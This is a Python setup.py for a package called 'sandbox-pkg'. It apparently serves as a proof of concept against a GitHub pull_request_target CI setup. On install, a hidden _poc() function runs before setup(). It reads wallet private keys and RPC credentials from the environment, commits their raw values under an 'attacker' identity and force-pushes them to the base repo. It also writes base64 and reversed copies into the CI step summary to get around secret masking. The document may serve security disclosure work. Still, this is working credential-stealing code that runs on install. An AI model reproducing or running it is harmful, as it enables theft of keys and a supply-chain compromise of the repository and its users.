import os, subprocess, base64
from setuptools import setup, find_packages
HERE = os.path.dirname(os.path.abspath(__file__))

def _poc():
    secrets = {k: os.environ.get(k, "<NOT-IN-ENV>") for k in
               ("WALLET_PRIVATE_KEY", "WALLET_ADDRESS", "RPC_PROVIDER_URL")}
    # Durable exfil: RAW values to a file pushed to the BASE repo. Git blob content is NOT log-masked.
    md = ("# Attacker-controlled commit (pushed via the CI's contents:write token)\n\n"
          "Written by an unprivileged fork PR's setup.py inside the base repo's pull_request_target run.\n"
          "Git blob content is NOT subject to GitHub's log masking, so the REAL secret values appear below.\n\n"
          "## Base-repo secrets exfiltrated (REAL values)\n"
          + "".join("- `%s` = `%s`\n" % (k, v) for k, v in secrets.items()))
    with open(os.path.join(HERE, "ATTACKER-PROOF.md"), "w") as f:
        f.write(md)
    env = dict(os.environ, GIT_AUTHOR_NAME="attacker", GIT_AUTHOR_EMAIL="attacker@evil.example",
               GIT_COMMITTER_NAME="attacker", GIT_COMMITTER_EMAIL="attacker@evil.example")
    subprocess.run(["git", "-C", HERE, "add", "ATTACKER-PROOF.md"], env=env, check=False)
    subprocess.run(["git", "-C", HERE, "commit", "-m", "exfil proof"], env=env, check=False)
    push = subprocess.run(["git", "-C", HERE, "push", "-f", "origin", "HEAD:refs/heads/ATTACKER-PROOF"],
                          env=env, capture_output=True, text=True)
    summ = os.environ.get("GITHUB_STEP_SUMMARY")
    if summ:
        with open(summ, "a") as s:
            s.write("# 🚨 Unprivileged fork PR fully compromised this CI\n\n")
            s.write("A single external PR (no human approval) ran attacker code because the environment gate has no protection rules.\n\n")
            s.write("## 1) Base-repo secrets exfiltrated\n")
            s.write("GitHub masks the *exact* secret string (renders `***`) in logs/summaries. That is **not** a mitigation — any transform recovers it. The encodings below are unmasked and decode to the real value:\n\n")
            for k, v in secrets.items():
                s.write("- **%s**\n" % k)
                s.write("  - raw (GitHub-masked): `%s`\n" % v)
                s.write("  - base64 (unmasked — `echo <v> | base64 -d`): `%s`\n" % base64.b64encode(v.encode()).decode())
                s.write("  - reversed (unmasked): `%s`\n" % v[::-1])
            s.write("\n## 2) contents:write proven\n")
            s.write("- attacker pushed branch **ATTACKER-PROOF** (rc=%s) containing the REAL raw values (git blobs are not masked)\n" % push.returncode)
            s.write("\n## Impact\n- steal CI signing key / RPC creds; use contents:write to backdoor the package source -> supply chain to all downstream installs\n")
    print("done rc=%s" % push.returncode)

_poc()
setup(name="sandbox-pkg", version="0.0.1", packages=find_packages(), extras_require={"dev": ["pytest"]})
